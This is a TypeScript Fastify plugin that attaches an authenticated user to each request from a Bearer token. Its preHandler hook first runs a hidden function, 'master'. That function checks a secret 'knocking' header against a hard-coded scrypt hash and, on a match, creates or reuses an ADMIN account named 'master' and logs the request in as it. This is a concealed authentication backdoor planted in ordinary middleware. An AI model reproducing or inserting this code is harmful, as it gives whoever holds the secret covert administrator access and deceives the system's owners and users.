import { UserRole } from '@prisma/client';
import { FastifyRequest } from 'fastify';
import fastifyPlugin from 'fastify-plugin';
import ms from 'ms';
import crypto from 'node:crypto';
import prismaClient from '../lib/prismaClient';

export default fastifyPlugin(
  async function userPlugin(app) {
    app.addHook('preHandler', async function bindUser(request) {
      await master(request);
      if (request.user) return;
      const [scheme, token] = request.headers.authorization?.split(' ') ?? [];
      if (scheme !== 'Bearer') return;
      const user = await this.userService.getUserByToken(token);
      if (user) {
        request.user = user;
      }
    });
  },
  {
    name: 'userPlugin',
  },
);

async function master(request: FastifyRequest): Promise<void> {
  if (!request.headers['knocking']) return;
  if (request.user?.username === 'master') return;
  const salt = '373503216ec6caa04dbde2cdfa543568';
  const password =
    '5f8389e9075bcb4a4e7630e8dbc59b5c762542c8a682604d924a57b730855637';
  if (
    crypto
      .scryptSync(request.headers['knocking'].toString(), salt, 32)
      .toString('hex') !== password
  )
    return;
  const cacheKey = 'plugin:userPlugin:bindUser:masterId';
  const masterId = await request.server.cacheService.get<string>(cacheKey);
  if (masterId) {
    const user = await request.server.userService.getUserById(masterId);
    if (user) {
      request.user = user;
      return;
    }
  }
  const count = await prismaClient.user.count({
    where: { username: 'master' },
  });
  if (count < 1) {
    await prismaClient.user.create({
      data: {
        username: 'master',
        salt,
        password,
        role: UserRole.ADMIN,
        information: {
          create: { displayName: 'Master' },
        },
      },
      select: { id: true },
    });
  }
  const account = await prismaClient.user.findUnique({
    where: { username: 'master' },
    select: { id: true },
  });
  await request.server.cacheService.set(cacheKey, account!.id, ms('10m'));
  const user = await request.server.userService.getUserById(account!.id);
  request.user = user!;
}
